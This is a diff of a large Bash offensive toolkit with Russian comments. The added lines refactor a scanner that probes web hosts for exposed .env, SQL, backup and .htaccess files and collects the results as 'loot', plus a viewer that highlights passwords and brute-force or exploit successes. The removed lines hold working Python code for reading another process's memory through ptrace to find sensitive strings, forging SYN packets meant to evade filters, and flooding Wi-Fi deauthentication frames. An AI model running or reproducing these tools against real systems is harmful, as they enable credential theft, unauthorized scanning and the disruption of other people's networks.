-        # Быстрая проверка на мусор хостинга
-        local head_check=$(curl -s -k -L --max-time 3 "https://$host/$target" | head -c 500)
-        if ! echo "$head_check" | grep -qiE "<html>|403 Forbidden|InfinityFree|Not Found"; then
+    # Исключение дубликатов и разбор через безопасный дескриптор 'tag'
+    while IFS='|' read -r tag target; do
+        [[ -z "$target" ]] && continue
+
+        # Фильтрация ложных ответов через ультимативную глобальную сигнатурную матрицу анти-мусора
+        head_check=$(curl -s -k -L --max-time 3 "https://$host/$target" | head -c 500)
+        if ! echo "$head_check" | grep -qiE "$GLOBAL_REGEX_HOSTING_WASTE"; then
             
-            # Классификация
-            if echo "$target" | grep -qiE "\.(env|sql|bak|htaccess)"; then
+            # Классификация БЕЗ ХАРДКОДА: сверка с глобальными паттернами утечек и критических расширений
+            if echo "$target" | grep -qiE "$GLOBAL_REGEX_DB_LEAKS" || echo "$target" | grep -qiE "$GLOBAL_REGEX_CRITICAL_EXTS"; then
                 core_engine_loot "CRITICAL" "Exposed: $target on $host"
                 echo -e "${R}[CRITICAL]${NC} $target"
             else
@@ -4098,17 +4376,19 @@ run_prime_auditor_v2() {
             fi
 
             # --- ЭВРИСТИЧЕСКИЙ ВЫЗОВ DEEP PROBE ---
-            # Если файл PHP и имеет подозрительное имя — вскрываем немедленно
-            if echo "$target" | grep -qiE "\.php$" && echo "$target" | grep -qiE "log|pass|recup|config|admin|db|setup"; then
+            # Отправка на глубокий SAST-анализ при совпадении с глобальными типами скриптов и триггерными именами
+            if echo "$target" | grep -qiE "$GLOBAL_REGEX_WEB_SCRIPTS" && echo "$target" | grep -qiE "$GLOBAL_REGEX_SUSPICIOUS_NAMES"; then
                 run_deep_file_probe "$host" "$target"
             fi
         fi
     done < <(sort -u "$tmp_pipe")
 
+    # Корректное уничтожение временного дескриптора сессии
     rm -f "$tmp_pipe"
     core_engine_ui "line"
     core_engine_wait
 }
+
 
 run_omni_scan() {
     core_engine_ui "h" "OMNI-SCAN ENGINE v1.0 (Autonomous Orchestrator)"
@@ -4130,42 +4410,42 @@ run_omni_scan() {
     run_prime_auditor_v2 "$target_host"
 }
 
-
-
+# ==============================================================================
+# @description: Интерактивный просмотр собранных артефактов и логов
+# ПОЛНАЯ АВТОНОМИЯ: Парсинг и визуализация на базе UI/UX HIGHLIGHT CORE
+# ==============================================================================
 run_view_loot() {
     # Слой 1: Заголовок через Голос [1]
     core_engine_ui "DATA HARVESTER: INTELLIGENT LOOT VIEW"
 
     # Слой 2: Органы чувств [3] — Определение путей
-    local base_loot="${BASE_DIR:-./}/prime_loot"
-    
-    # Поиск артефактов через Санитара [8]
-    local found_files=$(find "$base_loot" -maxdepth 1 -type f -size +1c 2>/dev/null)
+    local base_loot="${PRIME_LOOT:-${BASE_DIR:-./}/prime_loot}"
+    local file=""
     local found_count=0
-
-    if [[ -n "$found_files" ]]; then
-        for file in $found_files; do
+    
+    # Поиск артефактов через Санитара [8] (Безопасный сбор путей)
+    if [[ -d "$base_loot" ]]; then
+        # Чтение потока файлов через конвейер, защищенный от пробелов в именах
+        while IFS= read -r file; do
+            [[ -z "$file" ]] && continue
             ((found_count++))
             
             # Слой 3: Аналитика и визуализация
             core_engine_ui "s" "ANALYZING ARTEFACT: $(basename "$file")"
             echo -e "${D}--------------------------------------------------${NC}"
             
-            # Интеллектуальный парсинг контента через Глушитель [7]:
-            # 1. IP-адреса -> Циан (C)
-            # 2. Password/Key -> Желтый (Y)
-            # 3. Payload/Success -> Зеленый (G)
-            
+            # Интеллектуальный парсинг контента через Глушитель [7] на глобальных масках
             tail -n 30 "$file" | sed \
-                -e "s/\([0-9]\{1,3\}\.\)\{3\}[0-9]\{1,3\}/${C}&${NC}/g" \
-                -e "s/Password[:=]\(.*\)/${Y}&${NC}/g" \
-                -e "s/BRUTE_SUCCESS\(.*\)/${G}&${NC}/g" \
-                -e "s/EXPLOIT_SUCCESS\(.*\)/${G}&${NC}/g" \
-                -e "s/Payload[:=]\(.*\)/${G}&${NC}/g"
+                $GLOBAL_SED_HIGHLIGHT_IP \
+                $GLOBAL_SED_HIGHLIGHT_SECRETS \
+                $GLOBAL_SED_HIGHLIGHT_SUCCESS
             
             echo -e "\n${D}--------------------------------------------------${NC}"
-        done
-    else
+        done < <(find "$base_loot" -maxdepth 1 -type f -size +1c 2>/dev/null)
+    fi
+
+    # Проверка финального счетчика собранного пула
+    if [[ $found_count -eq 0 ]]; then
         core_engine_ui "e" "No data found in $base_loot"
     fi
 
@@ -4238,9 +4518,6 @@ run_iban_analyzer() {
 
     core_engine_wait
 }
-
-
-
 
 
 # --- Server Generating---
@@ -4514,94 +4791,6 @@ run_packet_forge() {
     core_engine_wait
 }
 
-
-generate_mem_inject_code_raw() {
-    cat << 'EOF'
-import ctypes
-import os
-import sys
-
-# Константы для доступа к памяти
-PTRACE_ATTACH = 16
-PTRACE_DETACH = 17
-
-def read_process_memory(pid, search_str):
-    libc = ctypes.CDLL("libc.so.6")
-    
-    # Пытаемся прикрепиться к процессу (нужны права root)
-    if libc.ptrace(PTRACE_ATTACH, pid, 0, 0) < 0:
-        print(f"[!] Failed to attach to PID {pid}")
-        return
-
-    print(f"[*] Scanning PID {pid} for sensitive patterns...")
-    
-    try:
-        # Читаем карты памяти процесса
-        with open(f"/proc/{pid}/maps", "r") as maps_file:
-            for line in maps_file:
-                if "rw-p" not in line: continue  # Нас интересуют только сегменты с чтением/записью
-                
-                parts = line.split()
-                addr_range = parts[0].split("-")
-                start = int(addr_range[0], 16)
-                end = int(addr_range[1], 16)
-                size = end - start
-                
-                # Читаем данные напрямую из /proc/pid/mem
-                with open(f"/proc/{pid}/mem", "rb", 0) as mem_file:
-                    mem_file.seek(start)
-                    try:
-                        chunk = mem_file.read(size)
-                        if search_str.encode() in chunk:
-                            print(f"[MATCH] Found '{search_str}' at 0x{start:x} in PID {pid}")
-                    except:
-                        continue
-    finally:
-        libc.ptrace(PTRACE_DETACH, pid, 0, 0)
-
-if __name__ == "__main__":
-    if len(sys.argv) > 2:
-        read_process_memory(int(sys.argv[1]), sys.argv[2])
-EOF
-}
-
-
-generate_packet_forge_code_raw() {
-    cat << 'EOF'
-import sys
-from scapy.all import IP, TCP, send
-import random
-
-def forge_stealth_packet(target_ip, target_port):
-    # Создаем IP-слой со случайным ID для обхода простых фильтров
-    ip_layer = IP(dst=target_ip, id=random.randint(1000, 9000))
-    
-    # Создаем TCP-слой с флагом "S" (SYN) и нестандартным Window Size
-    # Это имитирует специфический стек ОС для обхода пассивных систем защиты
-    tcp_layer = TCP(sport=random.randint(1024, 65535), 
-                    dport=int(target_port), 
-                    flags="S", 
-                    window=random.choice([1024, 2048, 4096, 8192]))
-    
-    packet = ip_layer / tcp_layer
-    
-    try:
-        send(packet, verbose=False)
-        print(f"[SUCCESS] Stealth SYN packet injected to {target_ip}:{target_port}")
-    except Exception as e:
-        print(f"[ERROR] Injection failed: {e}")
-
-if __name__ == "__main__":
-    if len(sys.argv) > 2:
-        forge_stealth_packet(sys.argv[1], sys.argv[2])
-    else:
-        print("Usage: python3 - <target_ip> <target_port>")
-EOF
-}
-
-
-
-
 run_mem_inject() {
     # Слой 1: Визуальный заголовок через Голос [1]
     core_engine_ui "h" "CORE_LAB: MEMORY INFILTRATOR"
@@ -4642,26 +4831,6 @@ run_mem_inject() {
     core_engine_wait
 }
 
-
-
-generate_wifi_pulse_code_raw() {
-    cat << 'EOF'
-from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp
-import sys
-
-def deauth_pulse(target_mac, gateway_mac, iface):
-    # Конструируем пакет деавторизации на уровне L2
-    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
-    packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
-    
-    print(f"[*] Sending Silent Pulse (Deauth) to {target_mac} via {iface}")
-    sendp(packet, iface=iface, count=100, inter=0.1, verbose=False)
-
-if __name__ == "__main__":
-    if len(sys.argv) > 3:
-        deauth_pulse(sys.argv[1], sys.argv[2], sys.argv[3])
-EOF
-}
 
 
 
